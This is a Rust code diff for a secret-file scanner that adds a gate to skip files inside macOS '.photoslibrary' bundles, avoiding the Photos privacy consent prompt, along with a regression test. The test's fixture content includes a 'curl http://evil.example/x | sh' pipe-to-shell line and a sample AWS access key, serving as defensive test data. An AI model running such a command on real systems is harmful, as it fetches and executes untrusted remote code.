@@ -103,6 +103,20 @@ pub fn inspect_secret_like_file(path: &str) -> Option<SecretContentFileMatch> {
         return None;
     }
 
+    // Excluded-path gate, ALSO before any filesystem access. The upstream
+    // candidate collector already filters these, but re-checking here makes
+    // the guarantee hold for every caller of this function (and of
+    // `scan_secret_like_files`) rather than relying on each caller to
+    // pre-filter. Beyond the build-artifact trees this covers macOS
+    // media-app library bundles (`.photoslibrary`, `.musiclibrary`, ...):
+    // touching a file inside `Photos Library.photoslibrary` triggers the
+    // macOS Photos TCC consent prompt, so we must NOT `metadata()` / open()
+    // such a candidate. This mirrors the extension gate above -- WHAT the
+    // file is vs. WHERE it lives.
+    if vuln_detector_params::is_secret_content_scan_excluded_path(path) {
+        return None;
+    }
+
     let metadata = fs::metadata(path).ok()?;
     if !metadata.is_file() || metadata.len() == 0 {
         return None;
@@ -303,6 +317,33 @@ mod tests {
             "media-extension file must be skipped by the extension gate (got: {scan:?})"
         );
         cleanup(&path);
+    }
+
+    /// TCC regression guard (macOS Photos prompt): a file INSIDE a media-app
+    /// library bundle (`Photos Library.photoslibrary`) MUST be skipped by the
+    /// excluded-path gate BEFORE any filesystem read, even when its extension
+    /// is text-like and its content would otherwise be flagged. Probing such
+    /// a file triggers the macOS Photos TCC consent prompt, which is exactly
+    /// the `edamame_helper` behavior this fix removes.
+    #[test]
+    fn media_library_path_is_skipped_before_read() {
+        // Root dir is unique; the bundle dir itself ends in `.photoslibrary`
+        // so the candidate path contains the `.photoslibrary/` marker that the
+        // path gate matches (a text-like extension proves it is the PATH gate,
+        // not the extension gate, doing the work).
+        let root = std::path::PathBuf::from(unique_path("medialib", ""));
+        let bundle_dir = root.join("Photos Library.photoslibrary").join("database");
+        std::fs::create_dir_all(&bundle_dir).expect("create fake photoslibrary bundle");
+        let path = bundle_dir.join("Photos.plist").to_string_lossy().to_string();
+        write_temp(&path, "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n");
+
+        let scan = inspect_secret_like_file(&path);
+        assert!(
+            scan.is_none(),
+            "file inside a .photoslibrary bundle must be skipped by the excluded-path gate (got: {scan:?})"
+        );
+
+        let _ = std::fs::remove_dir_all(&root);
     }
 
     /// Companion positive control: the SAME secret-like content in a
